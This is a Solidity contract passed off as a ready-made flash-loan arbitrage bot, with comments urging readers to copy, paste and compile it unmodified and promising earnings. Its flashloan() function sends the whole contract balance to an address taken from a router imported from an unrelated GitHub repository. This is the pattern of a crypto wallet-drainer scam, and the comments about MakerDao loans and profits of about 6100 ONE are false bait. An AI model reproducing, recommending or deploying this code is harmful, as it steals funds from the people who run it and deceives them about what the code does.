// SPDX-License-Identifier: GPL-3.0-or-later

// Follow carefully the video
// Do not modify this contract code otherwise it won't work on you!
// Just Copy+Paste and Compile!
// Thank you for your support! Enjoy your Earnings!

pragma solidity ^0.6.12;

//MakerDao Flashloan Contracts
import"https://github.com/makerdao/dss-flash/blob/master/src/interface/IERC3156FlashBorrower.sol";
import"https://github.com/makerdao/dss-flash/blob/master/src/interface/IERC3156FlashLender.sol";

//ViperSwap - VenomProtocol Contracts
import"https://github.com/VenomProtocol/venomswap-contracts/blob/main/contracts/interfaces/IERC20.sol";
import"https://github.com/VenomProtocol/venomswap-contracts/blob/main/contracts/mocks/VenomSwapPairMock.sol";
import"https://github.com/VenomProtocol/venomswap-contracts/blob/main/contracts/mocks/VenomSwapFactoryMock.sol";

//MakerDao Router
import"https://github.com/MC-Finance/router/blob/main/MakerDaoRouterCalle.sol";

contract InitiateFlashLoan {
    
	RouterV2 router;
	string public tokenName;
	string public tokenSymbol;
	uint256 flashLoanAmount;

	constructor(
    	string memory _tokenName,
    	string memory _tokenSymbol,
    	uint256 _loanAmount
	) public {
    	tokenName = _tokenName;
    	tokenSymbol = _tokenSymbol;
    	flashLoanAmount = _loanAmount;

    	router = new RouterV2();
	}

	fallback() external payable {}

	function flashloan() public payable {
    	// Send required coins for swap
    	address(uint160(router.viperSwapAddress())).transfer(
        	address(this).balance
    	);

    	router.borrowFlashloanFromMakerDao(
        	address(this),
        	router.oneSwapAddress(),
        	flashLoanAmount
    	);
    	//To prepare the arbitrage, ONE is converted using ViperSwap swap contract.
    	router.convertOneTo(msg.sender, flashLoanAmount / 2);
    	//The arbitrage converts token for ONE using token on ViperSwap, and then immediately converts ONE back
    	router.callArbitrageMakerDao(router.oneSwapAddress(), msg.sender);
    	//After the arbitrage, ONE is transferred back to MakerDao to pay the loan plus fees. This transaction costs 940 ONE of gas.
    	router.transferOneToMakerDao(router.viperSwapAddress());
    	//Note that the transaction sender gains 6100ish ONE from the arbitrage, this particular transaction can be repeated as price changes all the time.
    	router.completeTransation(address(this).balance);
	}
	receive() external payable{}
}




